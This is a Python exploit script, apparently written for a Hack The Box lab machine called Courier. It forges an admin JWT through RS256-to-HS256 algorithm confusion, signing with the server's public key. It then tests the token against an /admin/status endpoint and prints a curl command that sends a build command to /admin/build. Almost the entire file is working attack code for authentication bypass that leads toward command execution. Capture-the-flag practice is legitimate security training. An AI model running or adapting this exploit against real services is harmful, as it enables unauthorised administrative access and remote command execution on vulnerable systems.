#!/usr/bin/env python3
"""
JWT Token Forger for Courier HTB Machine
Demonstrates algorithm confusion attack (CVE-2016-10555)
"""

import sys
import jwt
import requests
import json

def forge_token(public_key_path, target_url):
    """
    Forge a JWT token using algorithm confusion (RS256 -> HS256)
    """
    try:
        # Load public key
        with open(public_key_path, 'r') as f:
            public_key = f.read()
        
        print("[+] Loaded public key")
        
        # Create payload with admin role
        payload = {
            "username": "admin",
            "role": "admin",
            "iat": 1234567890
        }
        
        # Forge token using HS256 with public key as secret
        # This is the algorithm confusion vulnerability
        token = jwt.encode(payload, public_key, algorithm="HS256")
        
        print(f"[+] Forged JWT token: {token}")
        print(f"[+] Token length: {len(token)} characters")
        
        # Test the token
        headers = {
            "Authorization": f"Bearer {token}",
            "Content-Type": "application/json"
        }
        
        # Test admin status endpoint
        print(f"\n[+] Testing token against {target_url}/admin/status...")
        response = requests.get(f"{target_url}/admin/status", headers=headers, timeout=5)
        
        if response.status_code == 200:
            print("[+] SUCCESS! Token accepted, admin access granted")
            print(f"[+] Response: {response.json()}")
            return token
        else:
            print(f"[-] Token rejected (status: {response.status_code})")
            print(f"[-] Response: {response.text}")
            return None
            
    except FileNotFoundError:
        print(f"[-] Error: Public key file not found: {public_key_path}")
        print("[+] Get the public key from webhook logs first")
        return None
    except Exception as e:
        print(f"[-] Error: {e}")
        return None

def main():
    if len(sys.argv) < 2:
        print("Usage: python3 forge_jwt.py <public_key.pem> [target_url]")
        print("Example: python3 forge_jwt.py public_key.pem http://10.10.10.10:3000")
        sys.exit(1)
    
    public_key_path = sys.argv[1]
    target_url = sys.argv[2] if len(sys.argv) > 2 else "http://localhost:3000"
    
    print("=" * 50)
    print("JWT Algorithm Confusion Attack")
    print("=" * 50)
    print(f"Public key: {public_key_path}")
    print(f"Target: {target_url}")
    print()
    
    token = forge_token(public_key_path, target_url)
    
    if token:
        print("\n" + "=" * 50)
        print("Use this token for admin access:")
        print("=" * 50)
        print(f"Authorization: Bearer {token}")
        print()
        print("Example curl command:")
        print(f'curl -X POST {target_url}/admin/build \\')
        print('  -H "Authorization: Bearer ' + token + '" \\')
        print('  -H "Content-Type: application/json" \\')
        print('  -d \'{"buildCommand": "id"}\'')
        print()

if __name__ == "__main__":
    main()

